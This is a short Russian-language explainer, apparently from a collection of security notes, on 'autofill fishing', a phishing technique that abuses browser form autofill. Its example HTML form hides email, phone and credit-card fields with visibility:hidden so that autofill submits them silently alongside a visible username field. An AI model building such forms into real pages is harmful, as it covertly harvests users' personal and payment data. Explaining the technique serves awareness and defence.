# Autofill fishing

**Autofill fishing** - это фишинговая атака, эксплуатирующая механизм автозаполнения форм браузера. Некоторые реализации механизма автозаполнения подразумевают "запоминание" браузером значений полей, предлагая в последствии их подстановку на основе совпадения атрибута `name` в полях ввода.  

## Пример

Форма с доверенного сайта:  

    <form action="billing">
        <input type="text" name="username" />
        <input type="text" name="email" />
        <input type="text" name="phone" />
        <input type="text" name="creedit_card_num" />
        <input type="submit">
    </form>

При отправке которой, пользователь дает разрешение браузеру запомнить значение полей ввода.  

Форма со стороннего сайта:

    <form action="log">
        <input type="text" name="username" />
        <div style="visibility: hidden;">
            <input type="text" name="email" />
            <input type="text" name="phone" />
            <input type="text" name="creedit_card_num" />
        </div>
        <input type="submit">
    </form>

Тут отправятся все поля, хотя пользователь увидит подстановку и отправку только поля `username`.  

[← Назад](../README.md)